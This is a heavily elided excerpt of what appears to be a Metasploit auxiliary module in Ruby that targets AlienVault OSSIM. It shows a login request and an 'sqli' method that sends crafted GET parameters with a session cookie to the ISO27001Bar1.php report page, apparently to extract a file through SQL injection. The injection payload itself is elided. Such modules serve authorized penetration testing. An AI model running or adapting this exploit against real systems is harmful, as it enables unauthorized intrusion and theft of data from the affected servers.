...
class MetasploitModule < Msf::Auxiliary
  ...
  def run
    ...
    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'ossim', 'session', 'login.php'))
  ...
  def sqli(left_marker, right_marker, i, cookie, filename)
    ...
    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'ossim', 'report', 'BusinessAndComplianceISOPCI', 'ISO27001Bar1.php'),
                           'cookie' => cookie,
                           'vars_get' => get)
